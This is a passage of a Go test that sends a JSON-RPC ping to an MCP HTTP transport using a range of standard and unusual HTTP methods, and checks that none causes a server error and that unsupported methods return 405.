	transport := NewTransport(handler)

	methods := []string{
		http.MethodGet,
		http.MethodPut,
		http.MethodPatch,
		http.MethodHead,
		http.MethodOptions,
		http.MethodTrace,
		http.MethodConnect,
		"PROPFIND",
		"CUSTOM",
	}

	for _, method := range methods {
		t.Run(method, func(t *testing.T) {
			req := httptest.NewRequest(method, "/mcp/v1", strings.NewReader(`{"jsonrpc":"2.0","id":1,"method":"ping"}`))
			req.Header.Set("Content-Type", "application/json")
			w := httptest.NewRecorder()
			transport.ServeHTTP(w, req)

			if w.Code >= 500 {
				t.Errorf("[FINDING] HTTP method %s caused server error: status=%d", method, w.Code)
			}
			if method != http.MethodPost && method != http.MethodDelete && w.Code != http.StatusMethodNotAllowed {
				t.Logf("[INFO] HTTP method %s returned %d (expected 405)", method, w.Code)
			}
		})
	}
}

